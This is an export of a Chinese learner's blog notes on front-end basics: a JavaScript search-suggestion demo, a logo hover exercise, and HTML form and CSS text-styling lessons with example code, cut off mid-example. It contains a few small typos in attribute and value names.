title="监听输入肺炎时，显示肺炎查询结果"></a>监听输入肺炎时，显示肺炎查询结果</h4><p>显示和隐藏我们知道可以利用CSS知识<code>display: block/none;</code> 进行控制。</p><p>因此首先我们修改CSS将<strong>登录查看历史</strong>设置可见，将<strong>搜索结果</strong>设置不可见</p><pre><code>main .search-result {  padding: 0;  display: none;}</code></pre><p>接着修改Javascript代码，动态控制显示和隐藏如下:</p><pre><code>const input = document.querySelector('input');const login = document.querySelector('.login');const searchResult = document.querySelector('.search-result');// 监听键盘事件input.addEventListener('keyup', function() {  // this 是DOM节点，this.value可以获取input内输入的值  if (this.value === '肺炎') {    login.style.display = 'none';    searchResult.style.display = 'block';  } else {    login.style.display = 'block';    searchResult.style.display = 'none';  }});</code></pre><p>大家尝试在右则输入肺炎和其他内容，可以看到控制效果和我们想要的一致。</p><h4 id="肺炎搜索结果动态显示"><a href="#肺炎搜索结果动态显示" class="headerlink" title="肺炎搜索结果动态显示"></a>肺炎搜索结果动态显示</h4><p>我们知道搜索结果肯定不会题面写死的，在实际情况下,这些数据都会实时变换的。</p><p>这部分数据是由Javascript发起网络请求返回的数据，然后利用动态生成节点的方法插入页面。</p><p>我们还未学习网络请求，暂时先模拟在Javascript代码中,</p><p>如下代码:</p><pre><code>let data = [  '&lt;em&gt;肺炎&lt;/em&gt;实时疫情动态',  '&lt;em&gt;肺炎&lt;/em&gt;的症状有哪些症状',  '&lt;em&gt;肺炎&lt;/em&gt;武汉',  '&lt;em&gt;肺炎&lt;/em&gt;症状',  '&lt;em&gt;肺炎&lt;/em&gt;最新',  '&lt;em&gt;肺炎&lt;/em&gt;是怎么引起的',  '&lt;em&gt;肺炎&lt;/em&gt;最新消息',  '&lt;em&gt;肺炎&lt;/em&gt;实时',  '&lt;em&gt;肺炎&lt;/em&gt;症状及表现',  '&lt;em&gt;肺炎&lt;/em&gt;最新情况'];</code></pre><p>我们需要利用这份数组数据，生成多个li标签内容,<br>li标签模板如下:</p><pre><code>function createSearchItem(txt) {  const item = document.createElement('li');  item.innerHTML = `&lt;i class="search"&gt;&lt;/i&gt;&lt;p&gt;${txt}&lt;/p&gt;&lt;i class="edit"&gt;&lt;/i&gt;`;  return item;}</code></pre><p>在这里我们使用innerHTML 和模板字符串快速创建li内<br>容。</p><p>最后我们需要遍历搜索结果数据数组，依次创建<code>li</code> ,并插入到页面中，代码如下:</p><pre><code>在这里我们使用innerHTML 和模板字符串快速创建li内容。最后我们需要遍历搜索结果数据数组，依次创建li ,并插入到页面中，代码如下:</code></pre><p>大家在右边输入肺炎测试下，最终效果和百度-样。</p><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>我们总结下本节课的解决思路:</p><p>首先我们在不考虑动态效果情况下，把页面中所涉及到的所有元素都用<strong>静态页面</strong>的形式写出来。</p><p>其次利用Javascript控制区域的<strong>显示和隐藏</strong>，达到动态效果。</p><p>最后根据写好的<strong>静态页面模板和数据，动态创建DOM节点</strong>。</p><p>接下来我们自己上手练习一下。</p><h4 id="京东狗切换"><a href="#京东狗切换" class="headerlink" title="京东狗切换"></a>京东狗切换</h4><p>我们先来完成一个图片动态切换的效果，如下GIF:</p><p><img src="https://style.youkeda.com/img/course/f4/9/21.gif" alt="image"></p><p>当鼠标放置在图片上，图片会进行切换，当离开图片时，图片恢复原样。</p><p><strong>提示</strong></p><ol><li>基础的HTML、 CSS样式已经内置在代码<br>中，大家只需完成JS部分</li><li>鼠标放置和离开的事件，已经默认写好，<br>大家只需完成之后的操作</li></ol><p>index.js</p><pre><code>const logo = document.querySelector('.logo');// 鼠标放置事件logo.addEventListener('mouseover', function() {  // 处理放置事件});// 鼠标离开事件logo.addEventListener('mouseout', function() {  // 处理离开事件});</code></pre><p>index.html(这里的图片也要在当前目录下创建文件夹)</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head lang="en"&gt;    &lt;meta charset="UTF-8" /&gt;    &lt;title&gt;京东&lt;/title&gt;    &lt;link rel="stylesheet" href="./index.css" /&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;img class="logo" src="./images/1.png" /&gt;    &lt;script src="./index.js"&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>CSS</p><pre><code>img {  border: 1px solid #ccc;  cursor: pointer;}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> JS基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web前端自学基础</title>
      <link href="/2020/10/26/web-qian-duan-ji-chu/"/>
      <url>/2020/10/26/web-qian-duan-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章：认识前端开发"><a href="#第一章：认识前端开发" class="headerlink" title="第一章：认识前端开发"></a>第一章：认识前端开发</h2><h3 id="什么是HTML"><a href="#什么是HTML" class="headerlink" title="什么是HTML"></a>什么是HTML</h3><p>超文本标记语言（HTML）是一种用于创建网页的标准标记语言。<strong>HTML描述了一个网站的结构，是一种标记语言而非编程语言</strong></p><p><strong>一个HTMl元素是HTML文件的几个基本组成单元，</strong> 是构建网站的基石。</p><p>浏览器使用HTML标签（&lt;html&gt;）和脚本(JavaScript)来诠释网页内容，但不会将标签显示在页面上。</p><p>HTML的发展经历了HTML1 (互联网工程任务组(IETF) 工作草案)、<br>HTML2.0 (1995 年发布)、HTML4.0 与HTML4.01 (W3C 的推荐标<br>准)、XHTML和沿用至今的HTML5, HTML5是对HTML标准的第五次<br>修订，要注意，HTML5本身并非技术，而是标准。国内通常所说的 HTML5实际上是html与css3及JavaScript和api等的一一个组合，大概<br>可以用以下公式说明: HTML5≈HTML +CSS3+ JavaScript+APl.</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.1/3.jpg" alt="image"></p><h3 id="什么是CSS"><a href="#什么是CSS" class="headerlink" title="什么是CSS"></a>什么是CSS</h3><p>css，即层叠样式表（又称串样式列表、级联样式表、串接样式表、阶层式样式表），是一种用来为结构化文档（如HTML文档或XML应用）添加样式（字体、颜色和间距等）的计算机语言，<strong>他的主要只能就是确定布局和元素的表现</strong></p><p><strong>CSS不能单独使用，</strong>，必须与HTML或XML一起协工作，为HTMl或XML起装饰作用。</p><h3 id="什么是JavaScript"><a href="#什么是JavaScript" class="headerlink" title="什么是JavaScript"></a>什么是JavaScript</h3><p><strong>JavaScript</strong>（通常缩写为<strong>JS</strong>）是一种高级、解释型的编程语言，它能使网页可交互，常用来为网页添加各式各样的动态功能，为用户提供更流畅美观的浏览效果。</p><p>JavaScript 支持面向对象编程，命令式编程，以及函数式标称。他提供语法来操控文本、数组、日期以及正则表达式等。它已经由ECMA（欧洲计算机制造协会）通过ECMAScript实现语言的标准化。</p><blockquote><p>Java与JavaScript是两门不同的编程语言。之所以它命名为JavaScript，是因为java式当时最流行的编程语言，名字中带有”Java”字样有助于这门新生语言的传播。虽然这两门语言不管是在名字上还是语法上都有很多的相似性，但是这两门编程语言从设计之初就有很大的不同，JavaScript的语言设计主要受到了Self（一种基于原型的编程语言）和Scheme（一门函数式编程语言）的影响。JavaScript是运行在浏览器中的一种动态、弱类型脚本语言，java是一种可以撰写跨平台应用软件的面向对象的静态、强类型程序设计语言。</p></blockquote><h2 id="第二章：认识HTML"><a href="#第二章：认识HTML" class="headerlink" title="第二章：认识HTML"></a>第二章：认识HTML</h2><ol><li>Html元素的结构</li><li>HTML中的嵌套</li><li>HTMl文档结构</li><li>HTML中的注释</li><li>认识MDN</li></ol><h2 id="第三章：HTML-文本标签"><a href="#第三章：HTML-文本标签" class="headerlink" title="第三章：HTML-文本标签"></a>第三章：HTML-文本标签</h2><h3 id="块状和内联标签"><a href="#块状和内联标签" class="headerlink" title="块状和内联标签"></a>块状和内联标签</h3><p>内联标签和块状标签是HTML里面两种主要的标签类型，它们最大的区别就是块状标签会为自己的内容占据新的一行，而内联标签则不会。</p><p>比如 ==&lt;img&gt;== 标签是内联标签，而 ==&lt;p&gt;== 标签是块状标签</p><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.3/6.png" alt="image"></p><h3 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h3><p><strong>&lt;img src=”url”&gt;</strong></p><h3 id="链接标签"><a href="#链接标签" class="headerlink" title="链接标签"></a>链接标签</h3><p><strong>&lt;a&gt;</strong> 标签是内联标签，用户点击后浏览器会跳转到指定网址</p><h4 id="链接标签的属性"><a href="#链接标签的属性" class="headerlink" title="链接标签的属性"></a>链接标签的属性</h4><p><strong>herf</strong></p><p>herf属性给出链接指向的网址。它的值应该是一个URL或者锚点。</p><p><strong>title</strong></p><p>title属性给出链接的署名信息。鼠标悬停在链接上方时，浏览器会将这个属性的值，以提示块的形式显示出来。</p><p><strong>target</strong></p><p>target属性指定如何展示打开的链接</p><p>target属性的值可以是”_self”、”_blank”、”_parent”、”_top”四个关键字之一</p><p>为”_self”的时候表示在当前页面打开</p><p>为”_blank”的时候表示在新页面打开</p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>&lt;ol&gt;表示有序<br>&lt;ul&gt;表示无序</p><pre><code>&lt;!-- 有序列表--&gt;&lt;ol&gt;    &lt;li&gt;完成工作画稿&lt;/li&gt;    &lt;li&gt;送奶奶去体检&lt;/li&gt;    &lt;li&gt;给今天生日的孩子买蛋糕&lt;/li&gt;    &lt;li&gt;看完《滑动解锁》的最后一部分&lt;/li&gt;&lt;/ol&gt;</code></pre><h2 id="第四章：HTML-表单标签"><a href="#第四章：HTML-表单标签" class="headerlink" title="第四章：HTML-表单标签"></a>第四章：HTML-表单标签</h2><h3 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h3><p>有时我们需要用户输入来提供一些信息，为满足一些需求HTML提供了交互式表单控件</p><h5 id="form标签-1"><a href="#form标签-1" class="headerlink" title="form标签"></a>form标签</h5><p>我们需要完成如图所示这个表单的开发<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.4/1.jpg" alt="image"><br>在这个注册表单里都是输入框，按钮等表单元素，对于这些表单控件，我们需要一个块状元素 <code>&lt;form&gt;</code>把他们包起来，属于同一个表单的表单控件要包含在同一个块状元素<code>form</code>里。</p><p>此时需要了解,<code>action</code>和<code>method</code>:</p><blockquote><p>1.action:一个处理此表单信息的程序所在的URL，所述表格信息将在表单提交时被发送到定义的网址</p></blockquote><blockquote><p>2.method:它的值可以是GET或POST，用来规定如何发送表单信息</p></blockquote><p>通常表单信息被发送到<strong>服务器</strong>。</p><h3 id="单行文本输入框"><a href="#单行文本输入框" class="headerlink" title="单行文本输入框"></a>单行文本输入框</h3><p>单行文本输入框</p><pre><code>&lt;!-- action=""则表单信息将提交到当前页面 --&gt;&lt;form action=""&gt;  &lt;input type="text" /&gt;&lt;/form&gt;</code></pre><ol><li>占位文本</li></ol><p>，在昵称输入框中有”昵称”两个字，但是在在单行文本输入框中没有任何文字，这个文字在点击输入框并输入内容时就会消失，这是<strong>占位文本</strong> ，通过”placeholder”实行。</p><pre><code>&lt;input type="text" placeholder="昵称" /&gt;</code></pre><ol start="2"><li>value</li></ol><p>预填写</p><pre><code>&lt;input type="text" placeholder="昵称" name="nick" value="小明" /&gt;</code></pre><ol start="3"><li>不可修改的输入框<br>“readonly”和“disabled”</li></ol><p>我们不希望用户可以自行进行修改，变成只读输入框</p><pre><code>&lt;input type="text" placeholder="昵称" name="nick" value="小明" readonly /&gt;</code></pre><p>或者</p><pre><code>&lt;input type="text" placeholder="昵称" name="nick" value="小明" disabled /&gt;</code></pre><h3 id="多行文本输入框和密码输入框"><a href="#多行文本输入框和密码输入框" class="headerlink" title="多行文本输入框和密码输入框"></a>多行文本输入框和密码输入框</h3><ol><li>多行输入框</li></ol><p>使用textarea</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;  &lt;meta charset="UTF-8"&gt;  &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;  &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;  &lt;title&gt;示例表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;form action=""&gt;    &lt;textarea name="sign" rows="5" cols="30" placeholder="请输入个性签名"&gt;&lt;/textarea&gt;  &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><ol start="2"><li>密码输入框</li></ol><p>就是输入的内容不显示，只需要将<strong>type=”text”</strong>中的<strong>text</strong>改成<strong>password</strong></p><h3 id="单选框和复选框"><a href="#单选框和复选框" class="headerlink" title="单选框和复选框"></a>单选框和复选框</h3><pre><code>&lt;input type="radio" name="gender" value="male" /&gt;男&lt;input type="radio" name="gender" value="female" /&gt;女</code></pre><p>如何想单击文字也可以进行选择，则使用label标签</p><pre><code>&lt;label&gt; &lt;input type="radio" name="gender" value="male" /&gt;男 &lt;/label&gt;&lt;label&gt; &lt;input type="radio" name="gender" value="female" /&gt;女 &lt;/label&gt;</code></pre><p>另一种写法</p><pre><code>&lt;input id="male" type="radio" name="gender" value="male" /&gt;&lt;label for="male"&gt;男&lt;/label&gt;&lt;input id="female" type="radio" name="gender" value="female" /&gt;&lt;label for="female"&gt;女&lt;/label&gt;</code></pre><p>即id=”male”和for=”male”对应</p><h4 id="兴趣多选题（复选框）"><a href="#兴趣多选题（复选框）" class="headerlink" title="兴趣多选题（复选框）"></a>兴趣多选题（复选框）</h4><p>类型是checkbox</p><pre><code>&lt;input type="checkbox" /&gt;</code></pre><p>ex:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;    &lt;title&gt;编程题&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;form action="https://www.youkeda.com/"&gt;      &lt;label&gt;&lt;input type="checkbox" name="attention" value="aa"/&gt;我已阅读并同意相关服务条款和隐私政策&lt;/label&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="选项菜单"><a href="#选项菜单" class="headerlink" title="选项菜单"></a>选项菜单</h3><p>实现下面图片的效果，使用新的标签<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.4/6.jpg" alt="image"></p><p>每个选项用<code>&lt;option&gt;</code>标签表示，一组选项用<code>&lt;select&gt;</code>包裹</p><pre><code>&lt;select name="career"&gt;  &lt;option value="default"&gt;请选择职业&lt;/option&gt;  &lt;option value="staff"&gt;公司职员&lt;/option&gt;  &lt;option value="freelancer"&gt;自由职业者&lt;/option&gt;  &lt;option value="student"&gt;学生&lt;/option&gt;  &lt;option value="other"&gt;其他&lt;/option&gt;&lt;/select&gt;</code></pre><p>这是一个单选菜单，如果用户选择了”学生”，那么提交的数据是<code>&lt;option&gt;</code>中的标签属性<code>value</code>，所以每个value的值互不相同</p><p>思考：如果想要一个多选菜单的话，我们怎么办？</p><p>这时候我们可以给<code>&lt;select&gt;</code>标签添加multiple属性，就可以通过按住Ctrl(或者%)并单击选项来选中多个选项了：</p><pre><code>&lt;select name="career" multiple&gt;  &lt;option value="default"&gt;请选择职业&lt;/option&gt;  &lt;option value="staff"&gt;公司职员&lt;/option&gt;  &lt;option value="freelancer"&gt;自由职业者&lt;/option&gt;  &lt;option value="student"&gt;学生&lt;/option&gt;  &lt;option value="other"&gt;其他&lt;/option&gt;&lt;/select&gt;</code></pre><p>这时候我们再在下图加上职业选择菜单</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.4/1.jpg" alt="image"></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;  &lt;meta charset="UTF-8"&gt;  &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;  &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;  &lt;title&gt;示例表单&lt;/title&gt;  &lt;link type="text/css" rel="stylesheet" href="./index.css"&gt;&lt;/head&gt;&lt;body&gt;  &lt;form action=""&gt;    &lt;input type="text" placeholder="请输入昵称" name="nick" /&gt;    &lt;textarea name="sign" rows="5" cols="30" placeholder="请输入个性签名"&gt;&lt;/textarea&gt;    &lt;input type="password" name="password" placeholder="请输入密码"&gt;    &lt;input id="male" type="radio" name="gender" value="male" /&gt;    &lt;label for="male"&gt;男&lt;/label&gt;    &lt;input type="radio" name="gender" value="female" /&gt;    &lt;label for="female"&gt;女&lt;/label&gt;    &lt;input id="coding" type="checkbox" name="interest" value="coding" /&gt;    &lt;label for="coding"&gt;编程&lt;/label&gt;    &lt;input id="other" type="checkbox" name="interest" value="other" /&gt;    &lt;label for="other"&gt;其他&lt;/label&gt;    &lt;select name="career"&gt;      &lt;option value="default"&gt;请选择职业&lt;/option&gt;        &lt;option value="staff"&gt;公司职员&lt;/option&gt;        &lt;option value="freelancer"&gt;自由职业者&lt;/option&gt;        &lt;option value="student"&gt;学生&lt;/option&gt;        &lt;option value="other"&gt;其他&lt;/option&gt;      &lt;/select&gt;  &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><p>表单的注册按钮<br>使用html的<code>&lt;button&gt;</code>标签：</p><pre><code>&lt;button&gt;注册&lt;/button&gt;</code></pre><p>因为<code>&lt;button&gt;</code>标签有闭合标签，在开始标签和结束标签之间我们可以放上文字、图片、图标等等</p><p>它放在form中点击的时候自动提交表单数据，但是在button提交表单数据这一点上是有浏览器的兼容性问题的，一般还是需要加上type=”submit”来确保数据的提交</p><pre><code>&lt;button type="submit"&gt;注册&lt;/button&gt;</code></pre><p>这样我们就完成了一个简单的注册表单</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.4/1.jpg" alt="image"></p><pre><code>&lt;form action=""&gt;  &lt;input type="text" name="name" placeholder="请输入昵称" /&gt;  &lt;textarea    name="sign"    rows="5"    cols="30"    placeholder="请输入个性签名"  &gt;&lt;/textarea&gt;  &lt;input name="password" type="password" placeholder="请输入密码" /&gt;  &lt;label&gt; &lt;input type="radio" name="gender" value="male" /&gt;男 &lt;/label&gt;  &lt;label&gt; &lt;input type="radio" name="gender" value="female" /&gt;女 &lt;/label&gt;  &lt;label&gt; &lt;input type="checkbox" name="interest" value="coding" /&gt;编程 &lt;/label&gt;  &lt;label&gt; &lt;input type="checkbox" name="interest" value="other" /&gt;其他 &lt;/label&gt;  &lt;select name="career"&gt;    &lt;option value="default"&gt;请选择职业&lt;/option&gt;    &lt;option value="staff"&gt;公司职员&lt;/option&gt;    &lt;option value="freelancer"&gt;自由职业者&lt;/option&gt;    &lt;option value="student"&gt;学生&lt;/option&gt;    &lt;option value="other"&gt;其他&lt;/option&gt;  &lt;/select&gt;  &lt;button type="submit"&gt;注册&lt;/button&gt;&lt;/form&gt;</code></pre><p>==homework==</p><p>将提交按钮改造成图片</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;    &lt;title&gt;编程题&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;form action="https://www.youkeda.com/"&gt;    &lt;button type="submit" value="提交"&gt;      &lt;img src="https://document.youkeda.com/P3-1-HTML-CSS/1.3/15.png" alt="" style="width: 200px;"/&gt;    &lt;/button&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>==homework:==</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.4/10.jpg" alt="image"><br>完成此表单</p><p>css</p><pre><code>form {  width: 350px;  margin: 0 auto;  margin-top: 20px;}input,button {  width: 100%;  margin-bottom: 14px;}input[type='checkbox'] {  width: unset;}input::-webkit-input-placeholder {  font-size: 14px;  color: #dbdbdb;}input:-moz-placeholder {  font-size: 14px;  color: #dbdbdb;}input::-moz-placeholder {  font-size: 14px;  color: #dbdbdb;} /* for the future */input:-ms-input-placeholder {  font-size: 14px;  color: #dbdbdb;}button {  background: #fe7300;  border: none;  color: #fff;  font-size: 18px;  line-height: 22px;  padding: 8px 26px;  font-weight: 500;  border-radius: 2px;}label {  cursor: pointer;  color: rgba(0, 0, 0, 0.8);  font-size: 14px;}label + span {  color: rgba(0, 0, 0, 0.8);  font-size: 14px;}label + span &gt; a {  cursor: pointer;  color: #005980;  text-decoration: none;}input {  box-sizing: border-box;  padding: 9px 14px;  border-radius: 2px;  border: 1px solid #dfe3e9;}input:focus {  outline: none;  border-color: rgba(254, 115, 0, 0.5);}</code></pre><p>html:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;    &lt;title&gt;编程题&lt;/title&gt;    &lt;link rel="stylesheet" href="./index.css"&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;form action="https://www.youkeda.com/"&gt;      &lt;input type="text" name="name" placeholder="姓名" /&gt;      &lt;input type="number" name="mobile" placeholder="手机号" /&gt;      &lt;input name="password" type="password" placeholder="密码不少于6位" /&gt;      &lt;input id="agreement" type="checkbox" name="agreement" value="agreement" /&gt;      &lt;label for="agreement"&gt;已阅读并同意使用条款以及非活跃号处理规范&lt;/label&gt;      &lt;button type="submit"&gt;立即注册&lt;/button&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="第五章：CSS-美化文档"><a href="#第五章：CSS-美化文档" class="headerlink" title="第五章：CSS-美化文档"></a>第五章：CSS-美化文档</h2><h3 id="HTML内部添加样式"><a href="#HTML内部添加样式" class="headerlink" title="HTML内部添加样式"></a>HTML内部添加样式</h3><p>学习如何在标签中引入css样式</p><h3 id="在标签中添加声明"><a href="#在标签中添加声明" class="headerlink" title="在标签中添加声明"></a>在标签中添加声明</h3><p>具体声明如下：</p><pre><code>&lt;input type="text" placeholder="手机号码" style=""&gt;</code></pre><ul><li>声明位置不分先后</li></ul><pre><code>&lt;input type="text" style="" placeholder="手机号码"&gt;&lt;!-- 或者 --&gt;&lt;input style="" type="text" placeholder="手机号码"&gt;</code></pre><p>以上都对</p><ul><li>与其他关键字之间用空格隔开</li></ul><p>==注意==：关键字和签名之间也要用空格隔开，以下写法是错误的：</p><pre><code>&lt;pstyle=""&gt;&lt;/p&gt;</code></pre><h4 id="2-在引号之间添加样式"><a href="#2-在引号之间添加样式" class="headerlink" title="2.在引号之间添加样式"></a>2.在引号之间添加样式</h4><pre><code>&lt;p style="font-size:14px;color:white"&gt;&lt;/p&gt;</code></pre><p>意思是：在p标签中的字体大小14px，颜色为白色</p><h3 id="字体大小-字体粗细"><a href="#字体大小-字体粗细" class="headerlink" title="字体大小/字体粗细"></a>字体大小/字体粗细</h3><p>CSS中，样式由属性和值组成，中间用冒号隔开，用分号收尾</p><h4 id="字体大小"><a href="#字体大小" class="headerlink" title="字体大小"></a>字体大小</h4><p>设置格式为：font-size:36px</p><blockquote><p>字体的大小：字体大小的尺寸</p></blockquote><p>注意：</p><blockquote><p>看到了style = “font-size: 12px;font-weight:bold”。可以看到bold后面没有分号，这是因为这一组属性后面没有其他属性了，所以可以把结尾的分号省略，但是这样的写法允许但不规范</p></blockquote><p>核心代码如下：</p><pre><code>&lt;!-- 设置字体的大小为12px --&gt;&lt;p style="font-size: 12px;"&gt;  一个轻量级和模块化的前端框架，用于开发快速和强大的web接口。&lt;/p&gt;&lt;!-- 设置字体的大小为24px --&gt;&lt;p style="font-size: 24px;"&gt;  一个轻量级和模块化的前端框架，用于开发快速和强大的web接口。&lt;/p</code></pre><h4 id="字体加粗"><a href="#字体加粗" class="headerlink" title="字体加粗"></a>字体加粗</h4><p>设置格式：font-weight:100</p><blockquote><p>设置文字的粗细时，不仅可以用数字，还可以用英文代替，normal（正常粗细），lighter（细），bold（粗），bolder（更粗）</p></blockquote><p>演示：</p><pre><code>&lt;p style="font-weight: 200;"&gt;优课达--学的比别人好一点～&lt;/p&gt;&lt;p style="font-weight: lighter;"&gt;优课达--学的比别人好一点～&lt;/p&gt;&lt;p style="font-weight: 400;"&gt;优课达--学的比别人好一点～&lt;/p&gt;&lt;p style="font-weight: normal;"&gt;优课达--学的比别人好一点～&lt;/p&gt;&lt;p style="font-weight: 700;"&gt;优课达--学的比别人好一点～&lt;/p&gt;&lt;p style="font-weight: bold;"&gt;优课达--学的比别人好一点～&lt;/p&gt;</code></pre><p>练习：补全代码</p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.5/5.2.3-zuoye.png" alt="image"></p><pre><code>&lt;!DOCTYpE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;字体粗细&lt;/title&gt;    &lt;link rel="stylesheet" href="index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;h6 style="font-weight:200"&gt;UIKIT&lt;/h6&gt;    &lt;p &gt;A lightweight and modular front-end framework for developing fast and        powerful web interfaces.&lt;/p&gt;    &lt;h6 style="font-weight:400"&gt;JOHN&lt;/h6&gt;    &lt;p&gt;A lightweight and modular front-end framework for developing fast and        powerful web interfaces.&lt;/p&gt;    &lt;h6 style="font-weight:700"&gt;MARY&lt;/h6&gt;    &lt;p&gt;A lightweight and modular front-end framework for developing fast and        powerful web interfaces.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="字体颜色-文字对齐方式"><a href="#字体颜色-文字对齐方式" class="headerlink" title="字体颜色/文字对齐方式"></a>字体颜色/文字对齐方式</h3><h4 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h4><h6 id="1-英文字母形式"><a href="#1-英文字母形式" class="headerlink" title="1.英文字母形式"></a>1.英文字母形式</h6><p>color：black</p><h6 id="2-十六进制颜色"><a href="#2-十六进制颜色" class="headerlink" title="2.十六进制颜色"></a>2.十六进制颜色</h6><p>十六进制颜色由#开头，后面跟三个数字，每个数字的范围是00~FF，每个数字代表一种颜色，最终的颜色由这三种颜色调和而成</p><p>这个颜色一般由设计师给我们，或者可以用吸色工具获取</p><h6 id="3-rgb形式"><a href="#3-rgb形式" class="headerlink" title="3.rgb形式"></a>3.rgb形式</h6><p>与十六进制的原理相同，由三种颜色的深浅组成，，每种颜色的范围是0~255，代表每种颜色的深浅</p><p>如：clolr:rgb(253,217,155)</p><h6 id="4-rgba形式"><a href="#4-rgba形式" class="headerlink" title="4.rgba形式"></a>4.rgba形式</h6><p>多出来的a代表透明度，Alpha(透明度),a在0~1之间</p><p><strong>注意：</strong></p><ol><li>多数情况下建议使用16进制表达方式</li><li>调试的时候可以使用英文字母形式，初期的调试就是随便设置一个颜色，查看区块是否存在，区块大小等，在盒模型中我们会遇到gi</li><li>如果要设置文字透明度或者背景透明度，就要用到abga形式</li></ol><p>举例：</p><pre><code>&lt;h3 style="color:#ff9a9e;font-weight:700;font-size: 24px;"&gt;UIzards&lt;/h3&gt;&lt;h4 style="font-size: 16px;color: #474d5d;font-weight: 400;"&gt;  Senior UX Designer&lt;/h4&gt;&lt;p style="font-size: 14px;color:#84868d;"&gt;  Nam liber tempor cum soluta nobis eleifend option congue nihil imperdiet  doming id quom placerat facer possim assum. Typi non habent claritatem  insitam; est usus legentis in iis qui faorum claritatem. Investigationes  demonstraverunt lectores legere me lius quod ii legunt saepius.&lt;/p&gt;</code></pre><h4 id="文字居中-居左-居右"><a href="#文字居中-居左-居右" class="headerlink" title="文字居中/居左/居右"></a>文字居中/居左/居右</h4><p>格式如下：</p><ul><li>text-align:centre;文字居中对齐</li><li>text-align:left;文字左对齐</li><li>text-align:right；文字右对齐齐</li></ul><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;文字对齐&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p style="text-align: left;"&gt;      西湖，位于浙江省杭州市西湖区龙井路1号，杭州市区西部，景区总面积49平方千米    &lt;/p&gt;    &lt;p style="text-align: right;"&gt;      西湖有100多处公园景点，有“西湖十景”、“新西湖十景”、“三评西湖十景”之说    &lt;/p&gt;    &lt;p style="text-align: center;"&gt;      